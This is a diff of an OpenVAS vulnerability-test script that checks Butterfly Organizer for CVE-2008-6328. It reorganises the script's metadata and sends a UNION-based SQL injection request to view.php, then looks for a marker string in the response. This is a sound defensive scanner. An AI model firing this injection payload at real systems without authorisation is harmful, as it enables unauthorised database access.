@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: butterfly_organizer_multiple_vulnerabilities.nasl 9350 2018-04-06 07:03:33Z cfischer $
+# $Id: butterfly_organizer_multiple_vulnerabilities.nasl 11449 2018-09-18 10:04:42Z mmartin $
 #
 # Butterfly Organizer Multiple SQL Injection and Cross-Site Scripting
 # Vulnerabilities
@@ -25,7 +25,27 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "Butterfly Organizer is prone to multiple cross-site scripting and an
+if (description)
+{
+  script_oid("1.3.6.1.4.1.25623.1.0.100055");
+  script_version("$Revision: 11449 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-18 12:04:42 +0200 (Tue, 18 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
+  script_bugtraq_id(29700);
+  script_cve_id("CVE-2008-6328");
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_name("Butterfly Organizer Multiple SQL Injection and Cross-Site Scripting Vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"solution_type", value:"WillNotFix");
+  script_tag(name:"summary", value:"Butterfly Organizer is prone to multiple cross-site scripting and an
   SQL-injection vulnerability because the application fails to
   sufficiently sanitize user-supplied input.
 
@@ -34,27 +54,7 @@ tag_summary = "Butterfly Organizer is prone to multiple cross-site scripting and
   access or modify data, or exploit latent vulnerabilities in the
   underlying database.
 
-  Butterfly Organizer 2.0.1 is vulnerable; other versions may also be affected.";
-
-if (description)
-{
- script_oid("1.3.6.1.4.1.25623.1.0.100055");
- script_version("$Revision: 9350 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
- script_bugtraq_id(29700);
- script_cve_id("CVE-2008-6328");
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_name("Butterfly Organizer Multiple SQL Injection and Cross-Site Scripting Vulnerabilities");
- script_category(ACT_ATTACK);
- script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "summary" , value : tag_summary);
+  Butterfly Organizer 2.0.1 is vulnerable; other versions may also be affected.");
  exit(0);
 }
 
@@ -64,13 +64,13 @@ include("http_keepalive.inc");
 port = get_http_port(default:80);
 if(!can_host_php(port:port))exit(0);
 
-foreach dir( make_list_unique( "/organizer", cgi_dirs( port:port ) ) ) { 
+foreach dir( make_list_unique( "/organizer", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
 
-  url = string(dir, "/view.php?id=-1+union+select+0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10+from+test_category&mytable=test_category");
+  url = string(dir, "/view.php?id=-1+union+select+0x53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10+from+test_category&mytable=test_category");
 
-  if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
+  if(http_vuln_check(port:port, url:url,pattern:"SQL-Injection-Test")) {
     report = report_vuln_url( port:port, url:url );
     security_message( port:port, data:report );
     exit( 0 );
